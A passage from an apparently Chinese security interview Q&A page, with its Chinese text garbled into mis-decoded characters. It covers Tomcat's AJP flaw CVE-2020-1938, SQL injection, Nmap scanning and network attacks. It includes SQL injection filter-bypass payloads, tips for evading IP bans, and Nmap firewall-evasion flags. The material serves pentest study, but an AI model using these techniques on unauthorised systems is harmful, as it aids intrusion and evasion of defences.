AJPåè®®æ¼æ´</h3><p><strong>æ¼æ´æè¿°</strong>ï¼š<br>Tomcat AJPåè®®æ¼æ´ï¼ˆCVE-2020-1938ï¼‰æ˜¯ç”±äºTomcatåœ¨å¤„ç†AJPè¯·æ±‚æ—¶ï¼Œæœªå¯¹è¯·æ±‚åšä»»ä½•éªŒè¯ï¼Œé€šè¿‡è®¾ç½®AJPè¿æ¥å™¨å°è£…çš„requestå¯¹è±¡çš„å±æ€§ï¼Œå¯¼è‡´äº§ç”Ÿäº†ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å’Œä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¯»å–TomcatæœåŠ¡å™¨ä¸Šwebappç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨åŒæ—¶å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯è¿›ä¸€æ­¥é€šè¿‡æ–‡ä»¶åŒ…å«ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡é©¬ï¼‰ï¼Œä»è€Œè·å–æœåŠ¡å™¨çš„æ§åˆ¶æƒã€‚</p><p><strong>å½±å“èŒƒå›´</strong>ï¼š</p><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><p><strong>æ¼æ´åŸç†</strong>ï¼š<br>Tomcaté…ç½®äº†ä¸¤ä¸ªConnectorï¼Œåˆ†åˆ«æ˜¯HTTPå’ŒAJPã€‚HTTPé»˜è®¤ç«¯å£ä¸º8080ï¼Œå¤„ç†HTTPè¯·æ±‚ï¼Œè€ŒAJPé»˜è®¤ç«¯å£ä¸º8009ï¼Œç”¨äºå¤„ç†AJPåè®®çš„è¯·æ±‚ã€‚AJPåè®®æ¯”HTTPæ›´åŠ ä¼˜åŒ–ï¼Œå¤šç”¨äºåå‘ä»£ç†å’Œé›†ç¾¤ç­‰åœºæ™¯ã€‚æ¼æ´æ˜¯ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œç”šè‡³åŒ…å«ä»»æ„æ–‡ä»¶ã€‚</p><p><strong>ä¿®å¤å»ºè®®</strong>ï¼š</p><ol><li><strong>å‡çº§Tomcatç‰ˆæœ¬</strong>ï¼šå°†Tomcatå‡çº§åˆ°9.0.31ã€8.5.51æˆ–7.0.100ç‰ˆæœ¬è¿›è¡Œæ¼æ´ä¿®å¤ã€‚</li><li><strong>ç¦ç”¨AJPåè®®ç«¯å£</strong>ï¼šåœ¨conf&#x2F;server.xmlé…ç½®æ–‡ä»¶ä¸­æ³¨é‡Šæ‰AJP Connectorçš„é…ç½®è¡Œï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;--&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>é…ç½®AJPè®¤è¯</strong>ï¼šä¸ºAJP Connectoré…ç½®secretRequiredå’Œsecretå±æ€§ï¼Œè®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">requiredSecret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>å…¶ä¸­ï¼Œ<code>YOUR_TOMCAT_IP_ADDRESS</code>å’Œ<code>YOUR_TOMCAT_AJP_SECRET</code>éœ€è¦æ›¿æ¢ä¸ºå®é™…çš„IPåœ°å€å’Œé«˜å®‰å…¨æ€§å¯†é’¥ã€‚</li></ol><h3 id="æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¦‚æœè¢«ban-IPæ€ä¹ˆåŠï¼Ÿ"><a href="#æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¦‚æœè¢«ban-IPæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¦‚æœè¢«ban IPæ€ä¹ˆåŠï¼Ÿ"></a>æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¦‚æœè¢«ban IPæ€ä¹ˆåŠï¼Ÿ</h3><p>åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè¢«ban IPï¼Œé™¤äº†æ¢ä»£ç†IPå¤–ï¼Œè¿˜å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ol><li><strong>è°ƒæ•´è¯·æ±‚é¢‘ç‡</strong>ï¼šé™ä½è¯·æ±‚é¢‘ç‡ï¼Œé¿å…è§¦å‘ç›®æ ‡ç³»ç»Ÿçš„é˜²æŠ¤æœºåˆ¶ã€‚</li><li><strong>ä½¿ç”¨VPNæˆ–ä»£ç†</strong>ï¼šä½¿ç”¨ä¸åŒçš„VPNæˆ–ä»£ç†IPï¼Œé¿å…ä½¿ç”¨å•ä¸€IPè¿›è¡Œå¤§é‡è¯·æ±‚ã€‚</li><li><strong>ä¿®æ”¹è¯·æ±‚ç‰¹å¾</strong>ï¼šä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„User-Agentã€Refererç­‰å­—æ®µï¼Œæ¨¡æ‹Ÿä¸åŒçš„æµè§ˆå™¨å’Œè®¾å¤‡ç‰¹å¾ã€‚</li><li><strong>åˆ†æ—¶è¯·æ±‚</strong>ï¼šå°†è¯·æ±‚åˆ†æ•£åœ¨ä¸åŒçš„æ—¶é—´æ®µï¼Œé¿å…çŸ­æ—¶é—´å†…å¤§é‡è¯·æ±‚ã€‚</li><li><strong>ä½¿ç”¨åˆæ³•çš„æµ‹è¯•ç¯å¢ƒ</strong>ï¼šåœ¨åˆæ³•çš„æµ‹è¯•ç¯å¢ƒä¸­è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿›è¡Œå¯èƒ½å¯¼è‡´IPè¢«bançš„æ“ä½œã€‚</li></ol><h3 id="SQLæ³¨å…¥å•å¼•å·è¢«è¿‡æ»¤äº†æ€ä¹ˆç»•è¿‡"><a href="#SQLæ³¨å…¥å•å¼•å·è¢«è¿‡æ»¤äº†æ€ä¹ˆç»•è¿‡" class="headerlink" title="SQLæ³¨å…¥å•å¼•å·è¢«è¿‡æ»¤äº†æ€ä¹ˆç»•è¿‡"></a>SQLæ³¨å…¥å•å¼•å·è¢«è¿‡æ»¤äº†æ€ä¹ˆç»•è¿‡</h3><p>å½“å•å¼•å·è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼š</p><ol><li><strong>æ³¨é‡Šç¬¦ç»•è¿‡</strong>ï¼šä½¿ç”¨æ³¨é‡Šç¬¦æ¥é—­åˆå•å¼•å·ã€‚ä¾‹å¦‚ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; --+</span><br></pre></td></tr></table></figure>è¿™é‡Œçš„<code>--</code>æ˜¯å•è¡Œæ³¨é‡Šç¬¦ï¼Œå¯ä»¥é—­åˆå‰é¢çš„å•å¼•å·ã€‚</li><li><strong>åŒå¼•å·ç»•è¿‡</strong>ï¼šå¦‚æœå…è®¸ä½¿ç”¨åŒå¼•å·ï¼Œå¯ä»¥ç”¨åŒå¼•å·ä»£æ›¿å•å¼•å·ã€‚ä¾‹å¦‚ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&quot;1&quot;</span><br></pre></td></tr></table></figure></li><li><strong>URLç¼–ç ç»•è¿‡</strong>ï¼šå°†å•å¼•å·è¿›è¡ŒURLç¼–ç ï¼Œä¾‹å¦‚å°†<code>&#39;</code>ç¼–ç ä¸º<code>%27</code>ã€‚</li><li><strong>åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡</strong>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0x3127</span><br></pre></td></tr></table></figure>è¿™è¡¨ç¤º<code>1&#39;</code>çš„åå…­è¿›åˆ¶ç¼–ç ã€‚</li><li><strong>å¤§å°å†™æ··åˆç»•è¿‡</strong>ï¼šåˆ©ç”¨MySQLå¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„ç‰¹ç‚¹ï¼Œæ··åˆä½¿ç”¨å¤§å°å†™æ¥ç»•è¿‡è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; AnD 1=1</span><br></pre></td></tr></table></figure></li><li><strong>é€»è¾‘è¿ç®—ç¬¦ç»•è¿‡</strong>ï¼šä½¿ç”¨<code>||</code>ä»£æ›¿<code>OR</code>ï¼Œä½¿ç”¨<code>&amp;&amp;</code>ä»£æ›¿<code>AND</code>ã€‚ä¾‹å¦‚ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; || 1=1</span><br></pre></td></tr></table></figure></li></ol><h3 id="passwdä¸shadowæ–‡ä»¶çš„å…³ç³»"><a href="#passwdä¸shadowæ–‡ä»¶çš„å…³ç³»" class="headerlink" title="passwdä¸shadowæ–‡ä»¶çš„å…³ç³»"></a>passwdä¸shadowæ–‡ä»¶çš„å…³ç³»</h3><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œ<code>/etc/passwd</code>å’Œ<code>/etc/shadow</code>æ–‡ä»¶å…±åŒç®¡ç†ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ï¼š</p><ul><li>**<code>/etc/passwd</code>**ï¼šå­˜å‚¨ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€ç”¨æˆ·IDã€ç»„IDã€ç”¨æˆ·æè¿°ã€ä¸»ç›®å½•å’Œç™»å½•shellã€‚å…¶ä¸­ï¼Œå¯†ç å­—æ®µåœ¨ç°ä»£ç³»ç»Ÿä¸­é€šå¸¸è¢«æ ‡è®°ä¸º<code>x</code>ï¼Œè¡¨ç¤ºå¯†ç å­˜å‚¨åœ¨<code>/etc/shadow</code>ä¸­ã€‚</li><li>**<code>/etc/shadow</code>**ï¼šå­˜å‚¨ç”¨æˆ·çš„åŠ å¯†å¯†ç ã€å¯†ç è¿‡æœŸæ—¶é—´ã€å¯†ç æ›´æ”¹é—´éš”ç­‰æ•æ„Ÿä¿¡æ¯ã€‚åªæœ‰å…·æœ‰é€‚å½“æƒé™çš„ç”¨æˆ·ï¼ˆå¦‚rootï¼‰æ‰èƒ½è®¿é—®æ­¤æ–‡ä»¶ã€‚</li></ul><p>ä¸¤è€…çš„å…³ç³»æ˜¯ï¼š<code>/etc/passwd</code>ä¸­çš„å¯†ç å­—æ®µæŒ‡å‘<code>/etc/shadow</code>ï¼Œåè€…å®é™…å­˜å‚¨å¯†ç ä¿¡æ¯ã€‚</p><h3 id="Linuxæ€æ ·ä»æ–‡ä»¶é€‰å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„è¡Œï¼Œå¹¶æ›¿æ¢ç›¸å…³å­—ç¬¦"><a href="#Linuxæ€æ ·ä»æ–‡ä»¶é€‰å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„è¡Œï¼Œå¹¶æ›¿æ¢ç›¸å…³å­—ç¬¦" class="headerlink" title="Linuxæ€æ ·ä»æ–‡ä»¶é€‰å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„è¡Œï¼Œå¹¶æ›¿æ¢ç›¸å…³å­—ç¬¦"></a>Linuxæ€æ ·ä»æ–‡ä»¶é€‰å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„è¡Œï¼Œå¹¶æ›¿æ¢ç›¸å…³å­—ç¬¦</h3><p>å¯ä»¥ä½¿ç”¨<code>grep</code>å’Œ<code>sed</code>å‘½ä»¤æ¥å®ç°ï¼š</p><ol><li><p><strong>é€‰å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„è¡Œ</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;ç‰¹å®šå­—ç¬¦&quot;</span> æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œé€‰å–åŒ…å«å­—ç¬¦<code>abc</code>çš„è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;abc&quot;</span> filename</span><br></pre></td></tr></table></figure></li><li><p><strong>æ›¿æ¢ç›¸å…³å­—ç¬¦</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&quot;s/æ—§å­—ç¬¦/æ–°å­—ç¬¦/g&quot;</span> æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œå°†æ–‡ä»¶ä¸­æ‰€æœ‰çš„<code>abc</code>æ›¿æ¢ä¸º<code>def</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&quot;s/abc/def/g&quot;</span> filename</span><br></pre></td></tr></table></figure><p>ç»“åˆä½¿ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;abc&quot;</span> filename | sed <span class="string">&quot;s/abc/def/g&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="VRRPåè®®çš„åŸç†åŠå®ç°"><a href="#VRRPåè®®çš„åŸç†åŠå®ç°" class="headerlink" title="VRRPåè®®çš„åŸç†åŠå®ç°"></a>VRRPåè®®çš„åŸç†åŠå®ç°</h3><p><strong>åŸç†</strong>ï¼š<br>VRRPï¼ˆVirtual Router Redundancy Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºæé«˜ç½‘ç»œå¯é æ€§çš„å†—ä½™åè®®ã€‚å®ƒé€šè¿‡åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ï¼Œå°†å¤šå°ç‰©ç†è·¯ç”±å™¨ç»„åˆæˆä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ç»„ã€‚åœ¨ç»„å†…ï¼Œä¸€å°è·¯ç”±å™¨æ‹…ä»»ä¸»è·¯ç”±å™¨ï¼ˆMasterï¼‰ï¼Œå…¶ä»–è·¯ç”±å™¨ä½œä¸ºå¤‡ä»½è·¯ç”±å™¨ï¼ˆBackupï¼‰ã€‚å½“ä¸»è·¯ç”±å™¨å‘ç”Ÿæ•…éšœæ—¶ï¼Œå¤‡ä»½è·¯ç”±å™¨ä¼šæ¥ç®¡è™šæ‹Ÿè·¯ç”±å™¨çš„è§’è‰²ï¼Œç¡®ä¿ç½‘ç»œçš„è¿ç»­æ€§ã€‚<br><strong>å®ç°</strong>ï¼š</p><ol><li><strong>é…ç½®è™šæ‹Ÿè·¯ç”±å™¨</strong>ï¼šåœ¨å¤šå°è·¯ç”±å™¨ä¸Šé…ç½®ç›¸åŒçš„è™šæ‹Ÿè·¯ç”±å™¨IDå’Œè™šæ‹ŸIPåœ°å€ã€‚</li><li><strong>ä¼˜å…ˆçº§è®¾ç½®</strong>ï¼šä¸ºä¸»è·¯ç”±å™¨è®¾ç½®è¾ƒé«˜çš„ä¼˜å…ˆçº§ï¼Œå¤‡ä»½è·¯ç”±å™¨è®¾ç½®è¾ƒä½çš„ä¼˜å…ˆçº§ã€‚</li><li><strong>æ•…éšœè½¬ç§»</strong>ï¼šå½“ä¸»è·¯ç”±å™¨å‘ç”Ÿæ•…éšœæ—¶ï¼Œå¤‡ä»½è·¯ç”±å™¨é€šè¿‡é€‰ä¸¾æœºåˆ¶æˆä¸ºæ–°çš„ä¸»è·¯ç”±å™¨ã€‚</li></ol><h3 id="SQLæ³¨å…¥çš„é‚£äº›é˜²å¾¡æªæ–½æ˜¯ç»å¯¹å®‰å…¨çš„ä¹ˆï¼Ÿ"><a href="#SQLæ³¨å…¥çš„é‚£äº›é˜²å¾¡æªæ–½æ˜¯ç»å¯¹å®‰å…¨çš„ä¹ˆï¼Ÿ" class="headerlink" title="SQLæ³¨å…¥çš„é‚£äº›é˜²å¾¡æªæ–½æ˜¯ç»å¯¹å®‰å…¨çš„ä¹ˆï¼Ÿ"></a>SQLæ³¨å…¥çš„é‚£äº›é˜²å¾¡æªæ–½æ˜¯ç»å¯¹å®‰å…¨çš„ä¹ˆï¼Ÿ</h3><p>æ²¡æœ‰é˜²å¾¡æªæ–½æ˜¯ç»å¯¹å®‰å…¨çš„ï¼Œä½†å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æœ€å¤§é™åº¦åœ°å‡å°‘SQLæ³¨å…¥çš„é£é™©ï¼š</p><ol><li><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼šé€šè¿‡å‚æ•°åŒ–æŸ¥è¯¢ç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸SQLä»£ç åˆ†ç¦»ã€‚</li><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ã€‚</li><li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸ºæ•°æ®åº“ç”¨æˆ·åˆ†é…æœ€å°å¿…è¦çš„æƒé™ã€‚</li><li><strong>å®šæœŸæ›´æ–°å’Œä¿®è¡¥</strong>ï¼šåŠæ—¶æ›´æ–°æ•°æ®åº“å’Œåº”ç”¨ç¨‹åºï¼Œä¿®å¤å·²çŸ¥æ¼æ´ã€‚</li><li><strong>ä½¿ç”¨Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰</strong>ï¼šWAFå¯ä»¥æ£€æµ‹å’Œé˜»æ­¢å¸¸è§çš„SQLæ³¨å…¥æ”»å‡»ã€‚</li></ol><h3 id="Nmapæ‰«æåŸç†ï¼ŒNmapæ‰«æä¸­çš„ä¸€äº›ç»†èŠ‚ï¼Œé’ˆå¯¹ä»€ä¹ˆæƒ…å†µä½¿ç”¨å“ªç§æ‰«æ"><a href="#Nmapæ‰«æåŸç†ï¼ŒNmapæ‰«æä¸­çš„ä¸€äº›ç»†èŠ‚ï¼Œé’ˆå¯¹ä»€ä¹ˆæƒ…å†µä½¿ç”¨å“ªç§æ‰«æ" class="headerlink" title="Nmapæ‰«æåŸç†ï¼ŒNmapæ‰«æä¸­çš„ä¸€äº›ç»†èŠ‚ï¼Œé’ˆå¯¹ä»€ä¹ˆæƒ…å†µä½¿ç”¨å“ªç§æ‰«æ"></a>Nmapæ‰«æåŸç†ï¼ŒNmapæ‰«æä¸­çš„ä¸€äº›ç»†èŠ‚ï¼Œé’ˆå¯¹ä»€ä¹ˆæƒ…å†µä½¿ç”¨å“ªç§æ‰«æ</h3><p><strong>åŸç†</strong>ï¼š<br>Nmapé€šè¿‡å‘é€å„ç§ç±»å‹çš„ç½‘ç»œæ•°æ®åŒ…æ¥æ¢æµ‹ç›®æ ‡ä¸»æœºå’Œç«¯å£çš„çŠ¶æ€ã€‚å¸¸è§çš„æ‰«æç±»å‹åŒ…æ‹¬ï¼š</p><ul><li><strong>TCP SYNæ‰«æ</strong>ï¼šå‘é€SYNæ•°æ®åŒ…ï¼Œé€‚ç”¨äºå¿«é€Ÿæ‰«æå¼€æ”¾ç«¯å£ã€‚</li><li><strong>TCP Connectæ‰«æ</strong>ï¼šä½¿ç”¨ç³»ç»Ÿè°ƒç”¨<code>connect</code>æ¥æ¢æµ‹ç«¯å£ã€‚</li><li><strong>UDPæ‰«æ</strong>ï¼šå‘é€UDPæ•°æ®åŒ…ï¼Œé€‚ç”¨äºå‘ç°UDPæœåŠ¡ã€‚</li><li><strong>ç‰ˆæœ¬æ£€æµ‹æ‰«æ</strong>ï¼šæ¢æµ‹æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li><li><strong>æ“ä½œç³»ç»Ÿæ£€æµ‹æ‰«æ</strong>ï¼šé€šè¿‡åˆ†æå“åº”æ•°æ®åŒ…æ¨æµ‹ç›®æ ‡æ“ä½œç³»ç»Ÿã€‚</li></ul><p><strong>ç»†èŠ‚</strong>ï¼š</p><ul><li><strong>ç«¯å£çŠ¶æ€</strong>ï¼šç«¯å£å¯èƒ½å¤„äº<code>open</code>ï¼ˆå¼€æ”¾ï¼‰ã€<code>closed</code>ï¼ˆå…³é—­ï¼‰ã€<code>filtered</code>ï¼ˆè¢«è¿‡æ»¤ï¼‰ç­‰çŠ¶æ€ã€‚</li><li><strong>æ‰«æé€Ÿåº¦</strong>ï¼šå¯ä»¥é€šè¿‡<code>-T</code>é€‰é¡¹è°ƒæ•´æ‰«æé€Ÿåº¦ã€‚</li><li><strong>è§„é¿æ£€æµ‹</strong>ï¼šä½¿ç”¨<code>-f</code>é€‰é¡¹è¿›è¡Œåˆ†ç‰‡æ‰«æï¼Œæˆ–ä½¿ç”¨<code>--source-port</code>æŒ‡å®šæºç«¯å£ã€‚</li></ul><p><strong>é’ˆå¯¹æƒ…å†µ</strong>ï¼š</p><ul><li><strong>å¿«é€Ÿæ‰«æ</strong>ï¼šä½¿ç”¨<code>-sS</code>è¿›è¡ŒTCP SYNæ‰«æã€‚</li><li><strong>å…¨é¢æ‰«æ</strong>ï¼šç»“åˆå¤šç§æ‰«æç±»å‹ï¼Œå¦‚<code>-sV</code>è¿›è¡Œç‰ˆæœ¬æ£€æµ‹ã€‚</li><li><strong>è§„é¿é˜²ç«å¢™</strong>ï¼šä½¿ç”¨åˆ†ç‰‡æ‰«ææˆ–éšæœºåŒ–æ‰«æé¡ºåºã€‚</li></ul><h3 id="å¦‚ä½•å¯¹å¤–ä½¿ç”¨nmapæ‰«æï¼Œé‡åˆ°-çš„æƒ…å†µåˆè¯¥æ€ä¹ˆåŠ"><a href="#å¦‚ä½•å¯¹å¤–ä½¿ç”¨nmapæ‰«æï¼Œé‡åˆ°-çš„æƒ…å†µåˆè¯¥æ€ä¹ˆåŠ" class="headerlink" title="å¦‚ä½•å¯¹å¤–ä½¿ç”¨nmapæ‰«æï¼Œé‡åˆ°***çš„æƒ…å†µåˆè¯¥æ€ä¹ˆåŠ"></a>å¦‚ä½•å¯¹å¤–ä½¿ç”¨nmapæ‰«æï¼Œé‡åˆ°***çš„æƒ…å†µåˆè¯¥æ€ä¹ˆåŠ</h3><p><strong>é‡åˆ°</strong>*çš„æƒ…å†µ**ï¼š</p><ul><li><strong>è¢«ban IP</strong>ï¼šå¯ä»¥å°è¯•ä½¿ç”¨ä»£ç†IPã€VPNæˆ–è°ƒæ•´æ‰«æé¢‘ç‡æ¥é¿å…è¢«banã€‚</li><li><strong>é˜²ç«å¢™é™åˆ¶</strong>ï¼šä½¿ç”¨Nmapçš„è§„é¿æ£€æµ‹åŠŸèƒ½ï¼Œå¦‚åˆ†ç‰‡æ‰«ææˆ–éšæœºåŒ–æ‰«æã€‚</li></ul><h3 id="ç½‘ç»œå±‚çš„å¸¸è§æ”»å‡»æ–¹å¼ï¼ŒIPæ¬ºéª—ï¼Œç¬¬ä¸‰æ–¹æ‹¦æˆª"><a href="#ç½‘ç»œå±‚çš„å¸¸è§æ”»å‡»æ–¹å¼ï¼ŒIPæ¬ºéª—ï¼Œç¬¬ä¸‰æ–¹æ‹¦æˆª" class="headerlink" title="ç½‘ç»œå±‚çš„å¸¸è§æ”»å‡»æ–¹å¼ï¼ŒIPæ¬ºéª—ï¼Œç¬¬ä¸‰æ–¹æ‹¦æˆª"></a>ç½‘ç»œå±‚çš„å¸¸è§æ”»å‡»æ–¹å¼ï¼ŒIPæ¬ºéª—ï¼Œç¬¬ä¸‰æ–¹æ‹¦æˆª</h3><p><strong>ç½‘ç»œå±‚å¸¸è§æ”»å‡»æ–¹å¼</strong>ï¼š</p><ul><li><strong>IPæ¬ºéª—</strong>ï¼šæ”»å‡»è€…ä¼ªé€ IPåœ°å€ï¼Œä½¿æ•°æ®åŒ…çœ‹èµ·æ¥æ¥è‡ªå¯ä¿¡æºã€‚é˜²èŒƒæªæ–½åŒ…æ‹¬ä½¿ç”¨IPsecè¿›è¡Œæ•°æ®åŒ…éªŒè¯ã€‚</li><li><strong>ç¬¬ä¸‰æ–¹æ‹¦æˆª</strong>ï¼šæ”»å‡»è€…é€šè¿‡ä¸­é—´äººæ”»å‡»æˆªå–å’Œç¯¡æ”¹æ•°æ®åŒ…ã€‚é˜²èŒƒæªæ–½åŒ…æ‹¬ä½¿ç”¨åŠ å¯†åè®®ï¼ˆå¦‚SSL&#x2F;TLSï¼‰å’Œè™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼ˆVPNï¼‰ã€‚</li><li><strong>æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoS&#x2F;DDoSï¼‰</strong>ï¼šé€šè¿‡å¤§é‡æµé‡ä½¿ç›®æ ‡ç³»ç»Ÿç˜«ç—ªã€‚é˜²èŒƒæªæ–½åŒ…æ‹¬ä½¿ç”¨é˜²ç«å¢™å’Œæµé‡æ¸…æ´—æœåŠ¡ã€‚</li></ul><h3 id="ASPä¸PHPç½‘ç«™çš„åŒºåˆ«"><a href="#ASPä¸PHPç½‘ç«™çš„åŒºåˆ«" class="headerlink" title="ASPä¸PHPç½‘ç«™çš„åŒºåˆ«"></a>ASPä¸PHPç½‘ç«™çš„åŒºåˆ«</h3><p><strong>ASP</strong>ï¼š</p><ul><li><strong>å¼€å‘ç¯å¢ƒ</strong>ï¼šé€šå¸¸ä¸Microsoftçš„IISæœåŠ¡å™¨å’Œ.NETæ¡†æ¶ç»“åˆä½¿ç”¨ã€‚</li><li><strong>è¯­æ³•</strong>ï¼šä½¿ç”¨VBScriptæˆ–JScriptç­‰è„šæœ¬è¯­è¨€ã€‚</li><li><strong>æ•°æ®åº“è¿æ¥</strong>ï¼šå¸¸ç”¨ADOï¼ˆActiveX Data Objectsï¼‰è¿›è¡Œæ•°æ®åº“æ“ä½œã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹å¯èƒ½æä¾›æ›´ä¸¥æ ¼çš„å®‰å…¨æ€§é…ç½®ã€‚</li></ul><p><strong>PHP</strong>ï¼š</p><ul><li><strong>å¼€å‘ç¯å¢ƒ</strong>ï¼šè·¨å¹³å°ï¼Œå¯åœ¨Apacheã€Nginxç­‰å¤šç§WebæœåŠ¡å™¨ä¸Šè¿è¡Œã€‚</li><li><strong>è¯­æ³•</strong>ï¼šCé£æ ¼çš„è¯­æ³•ï¼Œä¸Perlã€Javaç­‰è¯­è¨€ç›¸ä¼¼ã€‚</li><li><strong>æ•°æ®åº“è¿æ¥</strong>ï¼šæä¾›å¤šç§æ•°æ®åº“æ‰©å±•ï¼Œå¦‚MySQLiã€PDOç­‰ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šéœ€è¦å¼€å‘è€…è‡ªè¡Œé…ç½®å®‰å…¨æ€§æªæ–½ã€‚</li></ul><h3 id="ä»€ä¹ˆå«DMA"><a href="#ä»€ä¹ˆå«DMA" class="headerlink" title="ä»€ä¹ˆå«DMA"></a>ä»€ä¹ˆå«DMA</h3><p><strong>DMAï¼ˆDirect Memory Accessï¼‰</strong>æ˜¯ä¸€ç§ç¡¬ä»¶æœºåˆ¶ï¼Œå…è®¸æŸäº›ç¡¬ä»¶å­ç³»ç»Ÿç›´æ¥ä¸ç³»ç»Ÿå†…å­˜è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œè€Œæ— éœ€CPUçš„å¹²é¢„ã€‚è¿™å¯ä»¥æé«˜æ•°æ®ä¼ è¾“çš„æ•ˆç‡ï¼Œå‡è½»CPUçš„è´Ÿæ‹…ã€‚</p><h3 id="è·å–ç½‘ç«™ç»å¯¹è·¯å¾„çš„å››ç§æ–¹å¼"><a href="#è·å–ç½‘ç«™ç»å¯¹è·¯å¾„çš„å››ç§æ–¹å¼" class="headerlink" 